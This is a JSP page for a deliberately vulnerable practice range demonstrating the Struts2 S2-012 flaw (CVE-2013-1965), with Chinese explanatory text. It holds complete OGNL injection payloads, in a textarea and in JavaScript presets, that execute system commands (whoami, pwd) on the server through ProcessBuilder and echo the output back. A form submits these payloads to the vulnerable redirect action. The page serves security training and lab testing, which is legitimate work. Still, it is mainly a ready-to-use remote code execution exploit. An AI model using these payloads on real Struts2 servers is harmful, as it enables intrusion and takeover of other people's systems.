<%@ taglib prefix="s" uri="/struts-tags" %>
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-012 靶场</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 980px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        .actions { display: flex; flex-wrap: wrap; gap: 10px; margin: 16px 0; }
        .preset-btn { border: 0; border-radius: 999px; padding: 10px 16px; font-size: 14px; cursor: pointer; background: #e6f2ef; color: #155b52; }
        .field { display: grid; gap: 8px; margin: 14px 0 18px; }
        .field label { font-weight: 600; }
        .field textarea { min-height: 168px; resize: vertical; padding: 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; font: 14px/1.6 Consolas, monospace; color: #1d2a35; width: 100%; box-sizing: border-box; }
        code, pre { font-family: Consolas, monospace; }
        pre { background: #15202b; color: #e7eef7; padding: 14px; border-radius: 12px; white-space: pre-wrap; word-break: break-word; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-012 演示靶场</h1>
        <p>这个模块用来演示 <code>S2-012 / CVE-2013-1965</code>。漏洞点在于 <code>redirect</code> result 里使用了 <code>${name}</code>，当 action 返回 redirect 时，Struts2 会在拼接跳转 URL 的过程中解析 <code>name</code> 的值。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="fillPreset('whoami')">回显 whoami</button>
            <button type="button" class="preset-btn" onclick="fillPreset('pwd')">回显 pwd</button>
        </div>
        <div class="field">
            <label for="payloadBox">name 参数 Payload</label>
            <textarea id="payloadBox">%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[512],#n=#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e,0,#n)),#f.getWriter().flush(),#f.getWriter().close()}</textarea>
        </div>
        <s:form id="redirectForm" action="user" method="post">
            <s:hidden name="flow" value="redirect"/>
            <s:textfield id="nameField" name="name" label="name"/>
            <s:submit value="触发 redirect"/>
        </s:form>
        <p>当前 name：<code><s:property value="name"/></code></p>
    </div>
</div>
<script>
    const payloads = {
        whoami: '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[512],#n=#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e,0,#n)),#f.getWriter().flush(),#f.getWriter().close()}',
        pwd: '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[512],#n=#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e,0,#n)),#f.getWriter().flush(),#f.getWriter().close()}'
    };

    function fillPreset(key) {
        const payload = payloads[key];
        document.getElementById('payloadBox').value = payload;
        document.getElementById('nameField').value = payload;
    }

    document.getElementById('payloadBox').addEventListener('input', function(event) {
        document.getElementById('nameField').value = event.target.value;
    });

    fillPreset('whoami');
</script>
</body>
</html>
